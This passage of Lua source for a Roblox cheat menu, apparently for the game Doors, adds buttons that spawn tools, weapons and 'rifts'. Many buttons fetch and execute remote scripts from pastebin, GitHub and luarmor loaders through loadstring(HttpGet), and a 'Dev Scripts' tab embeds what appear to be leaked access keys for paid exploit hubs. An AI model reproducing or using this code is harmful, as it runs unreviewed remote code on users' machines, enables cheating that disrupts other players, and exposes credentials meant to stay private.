		local CustomShop = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Custom%20Shop%20Items/Source.lua"))()


		-- Create your tool here
		local exampleTool = LoadCustomInstance("rbxassetid://" .. ShopIDItem)


		-- Create custom shop item
		CustomShop.CreateItem(exampleTool, {
			Title = "Example Item",
			Desc = "Example description",
			Image = "https://cdn.discordapp.com/attachments/1034486774627573821/1035460240352747541/ExampleImage.png",
			Price = PriceId,
			Stack = StockID,
		})
	end    
})



Tab:AddTextbox({
	Name = "ShopItem ID",
	Default = "0",
	TextDisappear = true,
	Callback = function(Value)
		ShopIDItem = Value
	end	  
})

Tab:AddTextbox({
	Name = "Price",
	Default = "999",
	TextDisappear = true,
	Callback = function(Value)
		PriceId = Value
	end	  
})

Tab:AddTextbox({
	Name = "In Stock",
	Default = "1",
	TextDisappear = true,
	Callback = function(Value)
		StockID = Value
	end	  
})

local Section = Tab:AddSection({
	Name = "Behavior Items"
})


Tab:AddButton({
	Name = "Shears On Everything",
	Callback = function()
		local Tool = game:GetObjects("rbxassetid://12685165702")[1]
		local Humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
		local Sound = Instance.new("Sound")

		Tool.Parent = game.Players.LocalPlayer.Backpack

		Sound.PlaybackSpeed = 1.25
		Sound.SoundId = "rbxassetid://9118823101"
		Sound.Parent = Tool

		Tool.Activated:Connect(function()
			local Use = Tool.Animations.use
			local UseTrack = Humanoid:LoadAnimation(Use)

			UseTrack:Play()
			Sound:Play()
			wait(0.25)
			Sound:Play()
			game:GetService("Players").LocalPlayer:GetMouse().Target:FindFirstAncestorOfClass("Model"):Destroy()
		end)

		Tool.Equipped:Connect(function()
			local Idle = Tool.Animations.idle
			local IdleTrack = Humanoid:LoadAnimation(Idle)

			IdleTrack:Play()
		end)
		Tool.Unequipped:Connect(function()
			for _,anim in pairs(Humanoid.Animator:GetPlayingAnimationTracks()) do
				anim:Stop()
			end
		end)  
	end    

})


Tab:AddButton({
	Name = "Banana Gun (SUPERHARDMODE FE)",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/CBxBM55t", true))()
	end    
})

Tab:AddButton({
	Name = "Seek Gun",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/main/seekgun.lua"))()
	end    
})

Tab:AddButton({
	Name = "Rocket Launcher",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/main/rocketLauncher.lua"))()
	end    
})

Tab:AddButton({
	Name = "Resize Stick",
	Callback = function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/IdkMyNameLoll/f0178af2301ca90c09895f10f3e7bd4b/raw/46899ccc3626f3485d85f990012f7ef37ae52e5e/resizerDoorsRemake'))()
	end    
})


Tab:AddButton({
	Name = "Gravity Gun",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Fuydutdtu/FEGravityGun/refs/heads/main/Gravity.lua"))()
	end    
})




local Section = Tab:AddSection({
	Name = "Random Items"
})





Tab:AddButton({
	Name = "Sword",
	Callback = function()
		-- GRUMBLE SPAWNER 
		--Q TO SPAWN

		local Speed = 12

		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local Debris = game:GetService("Debris")
		local UserInputService = game:GetService("UserInputService")

		local Player = Players.LocalPlayer
		local Character = Player.Character or Player.CharacterAdded:Wait()

		local Sword = game:GetObjects("rbxassetid://72674416931709")[1]

		local Cache = game:GetObjects("rbxassetid://96223289630255")[1]
		local Cache2 = game:GetObjects("rbxassetid://103869039972033")[1]

		Cache:Destroy()
		Cache2:Destroy()

		Sword.Parent = Player.Backpack

		task.spawn(function()
			local Tool = Sword
			local Handle = Tool:WaitForChild("Handle")
			local Humanoid = Character.Humanoid
			local Torso = Character:FindFirstChild("Torso") or Character:FindFirstChild("HumanoidRootPart")

			local function Create(ty)
				return function(data)
					local obj = Instance.new(ty)
					for k, v in pairs(data) do
						if type(k) == 'number' then
							v.Parent = obj
						else
							obj[k] = v
						end
					end
					return obj
				end
			end

			local BaseUrl = "rbxassetid://"

			local DamageValues = {
				BaseDamage = 5,
				SlashDamage = 10,
				LungeDamage = 30
			}

			local Animations = {
				R15Slash = 522635514,
				R15Lunge = 522638767
			}

			local Damage = DamageValues.BaseDamage

			local Grips = {
				Up = CFrame.new(0, 0, -1.70000005, 0, 0, 1, 1, 0, 0, 0, 1, 0),
				Out = CFrame.new(0, 0, -1.70000005, 0, 1, 0, 1, -0, 0, 0, 0, -1)
			}

			local Sounds = {
				Slash = Handle:WaitForChild("SwordSlash"),
				Lunge = Handle:WaitForChild("SwordLunge"),
				Unsheath = Handle:WaitForChild("Unsheath")
			}

			local ToolEquipped = false

			Tool.Grip = Grips.Up
			Tool.Enabled = true

			local function IsTeamMate(Player1, Player2)
				return (Player1 and Player2 and not Player1.Neutral and not Player2.Neutral and Player1.TeamColor == Player2.TeamColor)
			end

			local function TagHumanoid(humanoid, player)
				local Creator_Tag = Instance.new("ObjectValue")
				Creator_Tag.Name = "creator"
				Creator_Tag.Value = player
				Debris:AddItem(Creator_Tag, 2)
				Creator_Tag.Parent = humanoid
			end

			local function UntagHumanoid(humanoid)
				for i, v in pairs(humanoid:GetChildren()) do
					if v:IsA("ObjectValue") and v.Name == "creator" then
						v:Destroy()
					end
				end
			end

			local function CheckIfAlive()
				return (((Player and Player.Parent and Character and Character.Parent and Humanoid and Humanoid.Parent and Humanoid.Health > 0 and Torso and Torso.Parent) and true) or false)
			end

			local function Blow(Hit)
				if not Hit or not Hit.Parent or not CheckIfAlive() or not ToolEquipped then
					return
				end
				local RightArm = Character:FindFirstChild("Right Arm") or Character:FindFirstChild("RightHand")
				if not RightArm then
					return
				end
				local RightGrip = RightArm:FindFirstChild("RightGrip")
				if not RightGrip or (RightGrip.Part0 ~= Handle and RightGrip.Part1 ~= Handle) then
					return
				end
				local character = Hit.Parent
				if character == Character then
					return
				end
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if not humanoid or humanoid.Health == 0 then
					return
				end
				local player = Players:GetPlayerFromCharacter(character)
				if player and (player == Player or IsTeamMate(Player, player)) then
					return
				end
				UntagHumanoid(humanoid)
				TagHumanoid(humanoid, Player)
				humanoid:TakeDamage(Damage)	
			end

			local function Attack()
				Damage = DamageValues.SlashDamage
				Sounds.Slash:Play()

				if Humanoid then
					if Humanoid.RigType == Enum.HumanoidRigType.R6 then
						local Anim = Instance.new("StringValue")
						Anim.Name = "toolanim"
						Anim.Value = "Slash"
						Anim.Parent = Tool
					elseif Humanoid.RigType == Enum.HumanoidRigType.R15 then
						local Anim = Tool:FindFirstChild("R15Slash")
						if Anim then
							local Track = Humanoid:LoadAnimation(Anim)
							Track:Play(0)
						end
					end
				end	
			end

			local function Lunge()
				Damage = DamageValues.LungeDamage

				Sounds.Lunge:Play()

				if Humanoid then
					if Humanoid.RigType == Enum.HumanoidRigType.R6 then
						local Anim = Instance.new("StringValue")
						Anim.Name = "toolanim"
						Anim.Value = "Lunge"
						Anim.Parent = Tool
					elseif Humanoid.RigType == Enum.HumanoidRigType.R15 then
						local Anim = Tool:FindFirstChild("R15Lunge")
						if Anim then
							local Track = Humanoid:LoadAnimation(Anim)
							Track:Play(0)
						end
					end
				end	

				wait(0.2)
				Tool.Grip = Grips.Out
				wait(0.6)
				Tool.Grip = Grips.Up

				Damage = DamageValues.SlashDamage
			end

			Tool.Enabled = true
			local LastAttack = 0

			local function Activated()
				if not Tool.Enabled or not ToolEquipped or not CheckIfAlive() then
					return
				end
				Tool.Enabled = false
				local Tick = RunService.Stepped:wait()
				if (Tick - LastAttack < 0.2) then
					Lunge()
				else
					Attack()
				end
				LastAttack = Tick
				Damage = DamageValues.BaseDamage
				local SlashAnim = (Tool:FindFirstChild("R15Slash") or Create("Animation"){
					Name = "R15Slash",
					AnimationId = BaseUrl .. Animations.R15Slash,
					Parent = Tool
				})

				local LungeAnim = (Tool:FindFirstChild("R15Lunge") or Create("Animation"){
					Name = "R15Lunge",
					AnimationId = BaseUrl .. Animations.R15Lunge,
					Parent = Tool
				})
				Tool.Enabled = true
			end

			local function Equipped()
				if not CheckIfAlive() then
					return
				end
				ToolEquipped = true
				Sounds.Unsheath:Play()
			end

			local function Unequipped()
				Tool.Grip = Grips.Up
				ToolEquipped = false
			end

			Tool.Activated:Connect(Activated)
			Tool.Equipped:Connect(Equipped)
			Tool.Unequipped:Connect(Unequipped)

			Handle.Touched:Connect(Blow)
		end)




	end    
})







Tab:AddButton({
	Name = "Shit",
	Callback = function()
		local tool = game:GetObjects("rbxassetid://71611062983031")[1]
		tool.Parent = game.Players.LocalPlayer.Backpack
	end    
})

Tab:AddButton({
	Name = "Big Shit",
	Callback = function()
		local plr = game.Players.LocalPlayer
		local hum = plr.Character:WaitForChild("Humanoid")
		local plush = game:GetObjects("rbxassetid://112573993544884")[1]
		plush.Parent = plr.Backpack
		local anim = hum:LoadAnimation(plush.A.Hold)

		plush.Equipped:Connect(function()
			anim:Play()
		end)
		plush.Unequipped:Connect(function()
			anim:Stop()
		end)

		plush.Activated:Connect(function()
			plush.Toy:Play()
		end)
	end    
})




local Section = Tab:AddSection({
	Name = "Rifts"
})



Tab:AddButton({
	Name = "Viridis Rift (New Lore???)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Agadigas/Doors/refs/heads/main/VIRIDIS%20RIFT%20ORIGINAL", true))()

	end    
})


local Tab = Window:MakeTab({
	Name = "Dev Scripts",
	Icon = "rbxassetid://107642772703957",
	PremiumOnly = false
})






Tab:AddParagraph("Fast Key System","ONLY WORKS FOR DEVELOPERS!")





local Section = Tab:AddSection({
	Name = "Aggo_90"
})



Tab:AddButton({
	Name = "Ms Paint",
	Callback = function()

		script_key="CWfrHXsGTWdsRUHytkMleOWvNmkyZSmn";
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/002c19202c9946e6047b0c6e0ad51f84.lua"))()
	end    
})



Tab:AddButton({
	Name = "Astral Hub",
	Callback = function()

		script_key="xjdADQbagbVeYYjFmbufATIxoXWteCCQ";
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/955852b1ca77ce8454cc37e91c40bc33.lua"))()
	end    
})

local Section = Tab:AddSection({
	Name = "Thenum1boi"
})


Tab:AddButton({
	Name = "Ms Paint",
	Callback = function()

		script_key="XMmZYkGWcNwPAIqmxUGruWzFOTZDDkYg";
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/002c19202c9946e6047b0c6e0ad51f84.lua"))()
	end    
})



Tab:AddButton({
	Name = "Astral Hub",
	Callback = function()

		script_key="0";
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/955852b1ca77ce8454cc37e91c40bc33.lua"))()
	end    
})


OrionLib:Init()
